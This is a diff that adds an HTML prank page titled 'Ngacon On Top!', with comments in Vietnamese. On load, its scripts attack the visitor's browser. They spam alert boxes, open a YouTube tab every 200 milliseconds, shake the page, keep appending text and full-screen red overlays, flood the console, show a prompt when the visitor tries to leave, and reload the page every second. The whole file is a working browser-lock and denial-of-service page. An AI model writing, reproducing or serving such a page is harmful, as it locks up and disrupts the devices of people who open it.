@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ngacon On Top!</title>
+    <style>
+        body { 
+            background-color: #000;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 50px;
+            animation: shake 0.5s infinite alternate;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+            100% { transform: translateX(-10px); }
+        }
+        .fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 100px;
+            color: red;
+            z-index: 9999;
+        }
+    </style>
+    <script>
+        // Spam alert liên tục
+        function spamAlert() {
+            setInterval(() => { alert("Ngacon on top!"); }, 500);
+        }
+
+        // Mở nhiều tab không ngừng
+        function openTabs() {
+            setInterval(() => { window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank"); }, 200);
+        }
+
+        // Rung màn hình liên tục
+        function shakeScreen() {
+            setInterval(() => {
+                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg)`;
+            }, 100);
+        }
+
+        // Thay đổi nội dung trang
+        function spamText() {
+            setInterval(() => { document.body.innerHTML += "<h1>Ngacon on top!</h1>"; }, 100);
+        }
+
+        // Chặn việc đóng trang
+        function blockClose() {
+            window.onbeforeunload = () => "Bạn có chắc chắn muốn thoát?";
+        }
+
+        // Mở màn hình full screen với thông báo "Ngacon on top!"
+        function fullscreenTroll() {
+            setInterval(() => {
+                let div = document.createElement('div');
+                div.classList.add('fullscreen');
+                div.innerText = 'Ngacon on top!';
+                document.body.appendChild(div);
+            }, 1000);
+        }
+
+        // Spam console
+        function overloadConsole() {
+            setInterval(() => {
+                console.log("Ngacon on top! Ngacon on top!");
+            }, 200);
+        }
+
+        // Lặp lại việc tải lại trang
+        function endlessReload() {
+            setInterval(() => { window.location.reload(); }, 1000);
+        }
+    </script>
+</head>
+<body onload="spamAlert(); openTabs(); shakeScreen(); spamText(); blockClose(); fullscreenTroll(); overloadConsole(); endlessReload();">
+    <h1>Ngacon On Top!</h1>
+</body>
+</html>
